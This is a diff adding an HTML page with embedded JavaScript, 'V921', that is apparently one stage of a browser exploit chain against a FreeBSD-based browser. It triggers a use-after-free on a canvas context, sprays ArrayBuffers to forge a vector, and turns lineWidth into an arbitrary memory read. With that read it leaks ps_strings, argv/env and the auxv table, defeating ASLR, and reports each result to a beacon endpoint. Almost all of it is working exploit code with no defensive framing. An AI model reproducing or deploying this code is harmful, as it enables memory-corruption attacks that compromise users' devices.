@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V921 - fixed anchor leak (ps_strings + auxv)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #3fb950; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V921 - fixed anchor leak: ps_strings + argv/env + auxv</h1>
+
+<p class="key">
+<b>No sweep - the address is an ABI constant.</b> On amd64 FreeBSD the process stack lives at the
+TOP of user space: <code>USRSTACK = SHAREDPAGE = 0x7ffffffff000</code>, and the kernel writes
+<code>ps_strings</code> at <code>PS_STRINGS = USRSTACK - sizeof(struct ps_strings)</code> =
+<b><code>0x7fffffffefe0</code></b> (the lowered-shared-page variant is <code>0x7fffffffdfe0</code>).
+That page is mapped in every process, so the forged vector can read it (same primitive as V920,
+<code>lineWidth = *(m_buffer + (m_size-1)*400 + 48)</code>, here with <code>m_buffer = target-48</code>,
+<code>m_size = 1</code>). From <code>ps_strings</code> the probe walks <code>ps_argvstr</code> /
+<code>ps_envstr</code> and the auxv table below them: <b>AT_PHDR (main executable), AT_BASE (ld-elf),
+AT_ENTRY, AT_EXECPATH</b> are real 64-bit pointers = the ASLR wall falls.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v921_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v921_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v921_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V921-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 440)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+var F64 = new Float64Array(1), U32 = new Uint32Array(F64.buffer);
+function hexOf(x) { F64[0] = x; return '0x' + ('00000000' + U32[1].toString(16)).slice(-8) + ('00000000' + U32[0].toString(16)).slice(-8); }
+function bits(x) { F64[0] = x; return { hi: U32[1] >>> 0, lo: U32[0] >>> 0, hex: '0x' + ('00000000' + U32[1].toString(16)).slice(-8) + ('00000000' + U32[0].toString(16)).slice(-8) }; }
+function hexAddr(a) { return '0x' + Math.floor(a).toString(16); }
+function ptrOf(b) { return b.hi * 0x100000000 + b.lo; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 60) : 'none'; }
+
+/* FreeBSD amd64 LA48: USRSTACK = SHAREDPAGE = VM_MAXUSER - PAGE = 0x7ffffffff000
+   PS_STRINGS = USRSTACK - sizeof(struct ps_strings) = 0x7ffffffff000 - 32 */
+var ANCHOR_A = 0x7fffffffefe0;   /* FreeBSD 11/12/13-normal fixed PS_STRINGS */
+var ANCHOR_B = 0x7fffffffdfe0;   /* lowered shared page variant */
+var SAFE_PAGE = 0x7fffffffe000;  /* mapped in every layout (stack page / lowered shared page) */
+
+var VIEWS = null, KEEP = null, CTX = null, TAGMADE = 0;
+
+/* ---------- UAF trigger (same shape as V906/V919/V920) ---------- */
+function trigger(canvas, nsaves) {
+  var saved = null;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try {
+        ctx.lineWidth = 3.14159;
+        ctx.miterLimit = 7.77;
+        ctx.globalAlpha = 0.42;
+        ctx.lineDashOffset = 2.222;
+        ctx.shadowBlur = 5.55;
+        for (var s = 0; s < nsaves; s++) ctx.save();
+        ctx.lineWidth = 1.0;
+      } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp };
+}
+
+/* ---------- forge ---------- */
+function sprayForge(count) {
+  var abs = new Array(count);
+  VIEWS = new Array(count);
+  for (var i = 0; i < count; i++) {
+    var ab = new ArrayBuffer(768);
+    VIEWS[i] = new Uint32Array(ab);
+    abs[i] = ab;
+  }
+  KEEP = abs;
+}
+function forge(addr, k) {
+  var lo = addr % 0x100000000;
+  var hi = Math.floor(addr / 0x100000000);
+  for (var i = 0; i < VIEWS.length; i++) {
+    var v = VIEWS[i];
+    v[28] = lo;   /* +112 m_buffer lo */
+    v[29] = hi;   /* +116 m_buffer hi */
+    v[30] = k;    /* +120 m_size     */
+    v[31] = k;    /* +124 m_capacity */
+  }
+}
+/* read 8 bytes at addr: lineWidth = *(m_buffer + (m_size-1)*400 + 48) */
+function rd(addr) {
+  forge(addr - 48, 1);
+  lsSet('pending', hexAddr(addr));
+  var v = CTX.lineWidth;
+  lsDel('pending');
+  return v;
+}
+
+/* ---------- MISS detector ---------- */
+function tagContexts(n) {
+  var keep = [], made = 0, c;
+  for (c = 0; c < n; c++) {
+    var cc = document.createElement('canvas');
+    cc.width = 1; cc.height = 1;
+    var cx = null;
+    try { cx = cc.getContext('2d'); } catch (e) {}
+    if (cx) {
+      try { cx.lineWidth = 200 + made; } catch (e2) {}
+      keep.push(cc);
+      made++;
+    }
+  }
+  return { keep: keep, made: made };
+}
+function isTag(v) { return (typeof v === 'number' && v >= 200 && v < 200 + TAGMADE); }
+
+/* ---------- crash bookkeeping ---------- */
+function bads() {
+  try { var a = JSON.parse(lsGet('bad') || '[]'); return (a instanceof Array) ? a : []; }
+  catch (e) { return []; }
+}
+function addBad(a) {
+  var b = bads();
+  if (b.indexOf(a) < 0) { b.push(a); lsSet('bad', JSON.stringify(b)); }
+}
+
+/* ---------- ps_strings pattern ----------
+   struct ps_strings { char **ps_argvstr; u32 ps_nargvstr; char **ps_envstr; u32 ps_nenvstr; }
+   kernel guarantees: ps_envstr == ps_argvstr + (ps_nargvstr+1)*8  */
+function isPS(q, c) {
+  var b0 = bits(q[0]), b1 = bits(q[1]), b2 = bits(q[2]), b3 = bits(q[3]);
+  if (b0.hi !== 0x7fff || b2.hi !== 0x7fff) return false;
+  var argv = ptrOf(b0), env = ptrOf(b2), argc = b1.lo, envc = b3.lo;
+  if (argc > 4096 || envc > 65536) return false;
+  if (!(argv < c && argv > c - 0x400000)) return false;
+  if (env !== argv + (argc + 1) * 8) return false;
+  return true;
+}
+
+function asciiFromQ(q) {
+  var out = '';
+  for (var k = 0; k < q.length; k++) {
+    var b = bits(q[k]);
+    var arr = [b.lo & 0xff, (b.lo >>> 8) & 0xff, (b.lo >>> 16) & 0xff, (b.lo >>> 24) & 0xff,
+               b.hi & 0xff, (b.hi >>> 8) & 0xff, (b.hi >>> 16) & 0xff, (b.hi >>> 24) & 0xff];
+    for (var j = 0; j < 8; j++) {
+      var ch = arr[j];
+      if (ch === 0) return out;
+      out += (ch >= 32 && ch < 127) ? String.fromCharCode(ch) : '.';
+    }
+  }
+  return out;
+}
+
+function reloadSoon(ms) {
+  setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, ms);
+}
+
+/* ---------- main ---------- */
+function main() {
+  var q = location.search;
+
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('pending'); lsDel('bad'); lsDel('loads');
+    bks('RESET', 'cleared');
+    say('cleared. reopen ?op=auto');
+    return;
+  }
+
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+  if (loads > 14) {
+    bks('GIVEUP', 'loads=' + loads + ',bad=' + JSON.stringify(bads()));
+    say('too many loads (' + loads + ') - reopen with ?reset=1');
+    return;
+  }
+
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending');
+    var pa = parseInt(pend, 16);
+    addBad(pa);
+    bks('CRASH', 'addr=' + pend + ',bad=' + JSON.stringify(bads()));
+    say('previous read crashed at ' + pend + ' (recorded; will be skipped)');
+  }
+
+  bks('BOOT', 'ua=' + String(navigator.userAgent).slice(0, 48) + ',run=' + RUN);
+
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  window._v921canvas = canvas;
+
+  var t = trigger(canvas, 32);
+  if (!t.saved) { bks('ERR', 'trigger-failed'); say('trigger failed - reopen'); return; }
+  CTX = t.saved;
+
+  sprayForge(400);
+  var tk = tagContexts(8);
+  TAGMADE = tk.made;
+  bks('ARM', 'abs=400,tag=' + TAGMADE);
+  say('armed: 400 forges + ' + TAGMADE + ' taggers');
+
+  var bad = bads();
+
+  /* 0) sanity: an address that is mapped in every known layout */
+  if (bad.indexOf(SAFE_PAGE) >= 0) {
+    bks('SKIP', 'safe-page-bad=' + hexAddr(SAFE_PAGE));
+    say('top page already crashed - skipping sanity read');
+  } else {
+    try {
+      var sv = rd(SAFE_PAGE);
+      if (isTag(sv)) { bks('MISS', 'safe,tag=' + sv); reloadSoon(2500); return; }
+      bks('SAFE', 'a=' + hexAddr(SAFE_PAGE) + ',lw=' + hexOf(sv));
+      say('SAFE ' + hexAddr(SAFE_PAGE) + ' -> ' + hexOf(sv));
+    } catch (e) { bks('ERR', 'safe:' + errOf(e)); }
+  }
+
+  /* 1) locate ps_strings at the fixed anchors */
+  var cands = [ANCHOR_A, ANCHOR_B];
+  var anchor = null, q4 = null;
+  for (var ci = 0; ci < cands.length && !anchor; ci++) {
+    var c = cands[ci];
+    if (bad.indexOf(c) >= 0) { bks('SKIP', 'anchor=' + hexAddr(c) + ',bad'); continue; }
+    try {
+      var qs = [rd(c), rd(c + 8), rd(c + 16), rd(c + 24)];
+      if (isTag(qs[0])) { bks('MISS', 'anchor=' + hexAddr(c) + ',tag=' + qs[0]); reloadSoon(2500); return; }
+      bks('RAW', 'a=' + hexAddr(c) + ',q0=' + hexOf(qs[0]) + ',q1=' + hexOf(qs[1]) +
+                 ',q2=' + hexOf(qs[2]) + ',q3=' + hexOf(qs[3]));
+      say('RAW ' + hexAddr(c) + ' ' + hexOf(qs[0]) + ' ' + hexOf(qs[1]) + ' ' +
+          hexOf(qs[2]) + ' ' + hexOf(qs[3]));
+      if (isPS(qs, c)) { anchor = c; q4 = qs; }
+    } catch (e) { bks('ERR', 'anchor:' + errOf(e)); }
+  }
+
+  /* 1b) fallback: scan the top stack pages byte-by-byte for the ps_strings pattern.
+     ps_strings must live in a mapped page at the very top of user space; if the
+     layout is shifted by one page the fixed anchors miss, so look for it. */
+  if (!anchor) {
+    var pages = [SAFE_PAGE, SAFE_PAGE - 0x1000];
+    var found = null;
+    for (var pi = 0; pi < pages.length && !found; pi++) {
+      var pg = pages[pi];
+      if (bad.indexOf(pg) >= 0) continue;
+      var readable = true;
+      try { rd(pg); } catch (e) { readable = false; }
+      if (!readable) continue;
+      for (var off = 0; off <= 0xff0 && !found; off += 8) {
+        var a2 = pg + off;
+        if (bad.indexOf(a2) >= 0) continue;
+        var v0;
+        try { v0 = rd(a2); } catch (e) { break; }
+        var z0 = bits(v0);
+        if (z0.hi !== 0x7fff) continue;
+        var v2;
+        try { v2 = rd(a2 + 16); } catch (e) { break; }
+        if (bits(v2).hi !== 0x7fff) continue;
+        var v1 = rd(a2 + 8), v3 = rd(a2 + 24);
+        if (isPS([v0, v1, v2, v3], a2)) { found = a2; q4 = [v0, v1, v2, v3]; }
+      }
+      bks('SCAN', 'page=' + hexAddr(pg) + ',found=' + (found ? hexAddr(found) : 'no'));
+    }
+    if (found) anchor = found;
+  }
+
+  if (!anchor) {
+    bks('NOANCHOR', 'a=' + hexAddr(ANCHOR_A) + ',b=' + hexAddr(ANCHOR_B));
+    say('no ps_strings pattern at the fixed anchors or the top pages - see RAW/SCAN beacons');
+    lsSet('phase', 'done');
+    return;
+  }
+
+  var b0 = bits(q4[0]), b1 = bits(q4[1]), b2 = bits(q4[2]), b3 = bits(q4[3]);
+  var argv = ptrOf(b0), argc = b1.lo, env = ptrOf(b2), envc = b3.lo;
+  var aux = env + (envc + 1) * 8;
+  bks('PS', 'a=' + hexAddr(anchor) + ',argv=' + hexAddr(argv) + ',argc=' + argc +
+            ',env=' + hexAddr(env) + ',envc=' + envc + ',aux=' + hexAddr(aux));
+  say('PS_STRINGS CONFIRMED at ' + hexAddr(anchor));
+  say('argv=' + hexAddr(argv) + ' argc=' + argc + ' env=' + hexAddr(env) +
+      ' envc=' + envc + ' auxv=' + hexAddr(aux));
+
+  /* 2) auxv: up to AT_COUNT (37) pairs of 16 bytes */
+  var Q = [], i;
+  for (i = 0; i < 74; i++) {
+    var a = aux + i * 8;
+    if (bad.indexOf(a) >= 0) { Q.push(null); continue; }
+    try { Q.push(rd(a)); } catch (e) { Q.push(null); }
+  }
+
+  var s = '', sum = '', epPtr = null, phdr = null, phent = null, phnum = null;
+  for (i = 0; i < 37; i++) {
+    var tv = Q[2 * i], vv = Q[2 * i + 1];
+    if (tv === null || vv === null) break;
+    var tag = Math.round(tv);
+    if (!isFinite(tag) || tag < 0 || tag > 0xffff) break;
+    s += tag.toString(16) + ':' + hexOf(vv) + ' ';
+    if (s.length > 360) { bks('AUX', s); s = ''; }
+    if (tag === 0) break;
+    if (tag === 3) phdr = vv;
+    if (tag === 4) phent = Math.round(vv);
+    if (tag === 5) phnum = Math.round(vv);
+    if (tag === 15) epPtr = ptrOf(bits(vv));
+    if (tag === 3 || tag === 7 || tag === 9 || tag === 15) sum += 'AT' + tag + '=' + hexOf(vv) + ',';
+  }
+  if (s) bks('AUX', s);
+  bks('SUM', sum + 'phent=' + (phent === null ? '?' : phent) + ',phnum=' + (phnum === null ? '?' : phnum));
+
+  /* 3) execpath string */
+  if (epPtr && epPtr > 0 && epPtr < SAFE_PAGE) {
+    var ep = '', j;
+    for (j = 0; j < 8; j++) {
+      var ea = epPtr + j * 8;
+      if (bad.indexOf(ea) >= 0) break;
+      try { ep += asciiFromQ([rd(ea)]); } catch (e) { break; }
+    }
+    bks('EXECPATH', hexAddr(epPtr) + ' ' + ep);
+    say('execpath: ' + ep);
+  }
+
+  /* 4) ELF header of the main executable (AT_PHDR points into it) */
+  if (phdr && phent) {
+    var phI = ptrOf(bits(phdr));
+    var pageI = phI & ~0xfff;
+    var base40 = phI - 0x40;
+    try {
+      var e0 = rd(pageI);
+      var e1 = rd(base40);
+      bks('ELF', 'phdr=' + hexAddr(phI) + ',page=' + hexOf(e0) + ',p40=' + hexOf(e1) +
+                 ',phent=' + phent + ',phnum=' + phnum);
+      say('ELF page ' + hexAddr(pageI) + ' -> ' + hexOf(e0) + ' / p40 -> ' + hexOf(e1));
+    } catch (e) { bks('ERR', 'elf:' + errOf(e)); }
+  }
+
+  bks('DONE', 'anchor=' + hexAddr(anchor));
+  lsSet('phase', 'done');
+  say('DONE - check the beacons');
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 180)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
